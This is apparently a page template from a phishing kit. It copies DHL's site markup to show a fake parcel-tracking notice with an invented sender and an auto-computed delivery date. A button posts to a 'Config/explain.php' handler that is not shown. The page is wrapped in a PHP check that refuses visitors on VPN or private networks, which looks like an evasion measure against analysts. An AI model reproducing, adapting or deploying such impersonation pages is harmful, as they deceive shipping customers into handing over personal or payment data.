                <div class="l-grid l-grid--w-100pc-m-s l-grid--w-100pc-s-l l-grid--w-100pc-s-m l-grid--w-100pc-s l-grid--w-reset-m">
                    <div class="base-button js--country-selection-layer-close c--country-selection-layer-close js--cookie-set" tabindex="0" data-tracking="{&quot;component&quot;:&quot;dhl/components/global/country-selection-layer&quot;}">

                        <span>Stay on this site</span>

                    </div>
                    <span class="c-country-selection-layer--base-copy l-grid l-grid--w-100pc-s l-grid--center-s l-grid--middle-s l-grid--w-reset-m l-grid--left-m">or</span>
                    <a href="https://www.dhl.com/ma-en/home/location-selector-redirect.html" class="base-button base-button--white" data-tracking="{&quot;component&quot;:&quot;dhl/components/global/country-selection-layer&quot;}">

                        <span>Select a different location</span>

                    </a>
                </div>
            </div>
        </div>
    </div>









    <div class="section"></div>
    <div class="iparys_inherited"></div>





    <div class="c-global-newsflash--wrapper js--global-newsflash" data-jsonurl="/global/dhl/news-alerts.gnf.json">
        <div class="c-global-newsflash component-wide l-grid l-grid--left-s l-grid--bottom-s l-grid--nowrap-m js-global-newsflash">
            <div class="l-grid--w-90pc-s l-grid--w-90pc-m l-grid--left-m c-global-newsflash--content-wrapper">
                <i class="c-global-newsflash-icon-alert icon-exception"></i>
                <a data-linkname="newsflash" class="c-global-newsflash--copy js--global-newsflash--link c-global-newsflash--copy--mobile js-global-newsflash--copy--mobile   link no-nowrap l-grid--hidden-m l-grid--visible-s   " target="_blank" rel="noopener noreferrer"
                    title="View Alerts that may impact DHL services">View Alerts that may impact DHL services
                    <span class="sr-only">View Alerts that may impact DHL services</span>
                </a>
                <span class="c-global-newsflash-close link-icon icon-cancel js--global-newsflash-close" title="Close">
        <span class="sr-only">Close</span>
                </span>
            </div>
        </div>
    </div>


    <!--googleon: all-->

    <div class="l-view ">

        <?php include('./includes/templates/_header.php'); ?>
        <div class="js--nav-padding-layer c-nav--padding-layer"></div>

        <span class="link-anchor" id="parsysPathStage_marketing_stage_trac"></span>

        <div class="c-voc-marketing-stage flex component-margin">

        
        <div class="carda">

        <div  class="cardaa">

       <div class="spn"><h6><?php echo lang('xFrom'); ?></h6><p>UTSGLOBAL COMPANY,.CO.LTD</p></div>
       <div class="spn"><h6><?php echo lang('xDelv'); ?></h6><p><?php $Date = date('Y-m-d'); echo date('Y-m-d', strtotime($Date. ' + 3 days')); ?></p></div>

        </div>
        <div  class="cardaaa">

       <div class="spn"><h6><?php echo lang('xPackagenumber'); ?></h6><p><?php echo TRACKN; ?></p></div>

        </div>

       <h5 style="margin-top: 30px;"><?php echo lang('xHexplain'); ?></h5>
       <p class="para"><?php echo lang('xp1'); ?></p>
       <p class="para"><?php echo lang('xp2'); ?></p>
       <p class="para"><?php echo lang('xp3'); ?></p>
       <p class="para"><?php echo lang('xp4'); ?></p>
       <p class="para"><?php echo lang('xp5'); ?></p>
       <form method="post" action="Config/explain.php">
       <button style="margin-top: 20px;" class="c-voc-tracking-bar--button js--tracking-bar--button base-button btnx" title="Please fill out this field." name="submit" type="submit" >
                                    <?php echo lang('xCnt'); ?></h4>
							</button></form>
       
        </div>
            
        </div>


        <!--googleoff: all-->

        <nav class="c-component-breadcrumb l-grid">
            <span class="sr-only">You are here</span>


        </nav>
        <!--googleon: all-->
        <main id="wcag-main-content">




            <span class="link-anchor" id="parsysPath_icon_teaser_containe_29595530"></span>
            <div class="c-voc-icon-teasers component-wide component-margin">
                <h3 class="c-voc-icon-teasers--heading"><?php echo lang('xShippingServices'); ?></h3>

                <div class="c-voc-icon-teasers--headline-container teasers-5">

                    <div class="c-voc-icon-teasers--headline-item" style="flex-basis: calc(100% *(1 / 5));">
                        <span><?php echo lang('xPackages'); ?></span>
                    </div>

                    

                </div>

                <div class="c-voc-icon-teasers--card-container teasers-5">
                    <div class="c-voc-icon-teasers--card component-margin last">
                        <div class="c-voc-icon-teasers--outer-heading"><span><?php echo lang('xPackages'); ?></span></div>
                        <img class="c-voc-icon-teasers--card-image" src="./styles/glo-core-wizard-bulkletters.svg">
                        <div class="c-voc-icon-teasers--inner-heading"><?php echo lang('xDocumentParcel'); ?></div>





                    </div>













                    <div class="c-voc-icon-teasers--card component-margin ">
                        <div class="c-voc-icon-teasers--outer-heading">Pallets, Containers, Cargo</div>
                        <img class="c-voc-icon-teasers--card-image" src="./styles/glo-core-product-air.svg">
                        <div class="c-voc-icon-teasers--inner-heading"><?php echo lang('xAirFreight'); ?></div>





                        <ul>









                        </ul>
                    </div>





                    <div class="c-voc-icon-teasers--card component-margin ">
                        <div class="c-voc-icon-teasers--outer-heading">Pallets, Containers, Cargo</div>
                        <img class="c-voc-icon-teasers--card-image" src="./styles/glo-core-tracking-ocean.svg">
                        <div class="c-voc-icon-teasers--inner-heading"><?php echo lang('xOceanFreight'); ?></div>





                        <ul>





                        </ul>
                    </div>





                    <div class="c-voc-icon-teasers--card component-margin ">
                        <div class="c-voc-icon-teasers--outer-heading">Pallets, Containers, Cargo</div>
                        <img class="c-voc-icon-teasers--card-image" src="./styles/glo-core-tracking-road.svg">
                        <div class="c-voc-icon-teasers--inner-heading"><?php echo lang('xRoadFreight'); ?></div>





                        <ul>




                        </ul>
                    </div>





                    <div class="c-voc-icon-teasers--card component-margin last">
                        <div class="c-voc-icon-teasers--outer-heading">Pallets, Containers, Cargo</div>
                        <img class="c-voc-icon-teasers--card-image" src="./styles/glo-core-tracking-rail.svg">
                        <div class="c-voc-icon-teasers--inner-heading"><?php echo lang('xRailFreight'); ?></div>





                    </div>







                </div>
            </div>


















            <a class="base-button c-go-to-top-button js--go-to-top-button    icon-chevron-up" href="https://www.dhl.com/ma-en/home.html#" title="go to top" aria-label="go to top" data-tracking="{&quot;component&quot;:&quot;go-to-top-button&quot;}"></a>

        </main>
        <?php include('./includes/templates/_footer.php'); ?>

    </div>

    <div class="overlay js--overlay"></div>

</body>
<!-- For support [ Date Compiled - Thu Dec 29 16:36:03 UTC 2022 | Mask - 121 | Application Version - 6.10.1] -->

</html>
<?php
}
else{
die("LA REQUÊTE A ÉTÉ REFUSÉE : VÉRIFIEZ QUE VOUS N'ÊTES PAS CONNECTÉ À UN RÉSEAU PRIVÉ" );   
}


?>